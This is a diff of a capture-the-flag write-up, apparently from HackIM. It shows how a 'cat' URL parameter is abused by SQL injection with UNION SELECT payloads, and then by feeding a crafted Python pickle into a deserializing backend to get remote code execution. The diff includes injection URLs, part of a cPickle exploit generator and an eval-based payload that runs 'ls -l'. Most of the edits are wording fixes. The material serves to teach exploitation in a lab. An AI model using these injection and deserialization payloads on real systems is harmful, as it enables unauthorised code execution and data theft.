@@ -11,13 +11,13 @@ http://54.84.124.93/
 
 ## Solution
 
-After opening url, there's a simple HTML table with all stroed objects. There's only one parameter I could manipulate - Category id (cat).
+After opening url, there's a simple HTML table with all stored objects. There's only one parameter I could manipulate - Category id (cat).
 
 ### Phase one - SQL Injection
 
-Quick research revealed that 'cat' parameter is vulnerable to SQL Injection. Valid payload contains standard characters used in attacks based on SQLi (like +, /**/ and so on).
+Quick research revealed that 'cat' parameter is vulnerable to SQL Injection. Valid payload should contain standard characters used in attacks based on SQLi (like + as space, /**/ as comment and so on).
 
-First payload I've used and was fine, looks like this one (I used four columns in _union_ statement, because table had four columns):
+First payload I've used and was fine, looks like this one (I used four columns in _union_ statement, because displayed HTML table had four columns and I've assumed four is good number to start from :) ):
 
 ```bash
 http://54.84.124.93/?cat=2%2b1+and+1=1+union+select+1,2,3,4/**/
@@ -46,7 +46,7 @@ http://54.84.124.93/?cat=2+union+select+1,2,%22{aa,bb}%22,4/**/
 
 returned in the same place error message "invalid load key, '{'."
 
-Quick session with Google told me that such error messages points I'm playing with Pickle Python module, which is used to serialization and deserialization of Python objects (https://docs.python.org/3.4/library/pickle.html). After two or free blog posts (linked at the end of this writeup) I had, more or less, some idea how can I use this vector to get the flag.
+Quick session with Google told me that such error messages points I'm playing with Pickle Python module, which is used to serialization and deserialization of Python objects (https://docs.python.org/3.4/library/pickle.html). Two, maybe three blog posts later (linked at the end of this writeup) I had, more or less, some idea how can I use this vector to get the flag.
 
 
 ### Phase two - Remote Code Execution via Pickle module
@@ -54,7 +54,8 @@ Quick session with Google told me that such error messages points I'm playing wi
 As I've assumed that third column contains serialized Python object, which is deserialized on the backend side, I've started to create and inject simple exploits to get some valuable response.
 
 
-I've used for this simple Pickle exploit generator (from Nelson Elhage's - https://twitter.com/nelhage - blog post linked below):
+I've used for this simple Pickle exploit generator (from Nelson Elhage's blog - https://twitter.com/nelhage - linked below):
+
 
 ```python
 #!/usr/bin/python
@@ -71,7 +72,9 @@ shellcode = cPickle.dumps(Exploit())
 print shellcode
 ```
 
-Returned exploit looks like this:
+
+Generated exploit looks like this:
+
 
 ```bash
 $ ./cpicke_exploit.py 
@@ -86,7 +89,7 @@ Rp4
 
 ```
 
-To get this exploit working in injection payload, I had to use %0A as a separator between every line of above output (to be sure that Pickle deserializes this in right way).
+To get this exploit working in injection payload, I had to use _%0A_ as a separator between every line of above output (to be sure that Pickle deserializes payload in right way).
 
 Here's an example how to get result of _ls -l_ command:
 
@@ -109,14 +112,15 @@ http://54.84.124.93/?cat=1+and+1=2+union+select+1,2,%22c__builtin__%0Aeval%0A%28
 ```
 
 And the flag is:
-**flag{OSaaS_with_union_and_tickle_trend_it_is!}**
+
 
 ![flag]
 (unicle_flag.png)
 
 ## Summary
 
-I'v spent a lot of time on this task, because I had no experience with web application based on used stack - as you can see _vulnerable.py_file (which I saved just by curiosity, how the code looks like) - there's a **Flask** Python framework and **SQLAlchemy** simple ORM for Flask. Also I've never exploit Pickle code injection vulnerability in the wild before - so I've learnt a lot during HackIM CTF and this task. 
+I've spent a lot of time on this task, because I had no experience with web application based on used technologies - as you can see _vulnerable.py_ file (which I saved just by curiosity, how the code looks like) - there's a **Flask** Python framework and **SQLAlchemy** simple ORM for Flask. Also I've never exploit Pickle code injection vulnerability in the wild before - so I've learnt a lot while working on this task. 
+
 
 ## Links
 
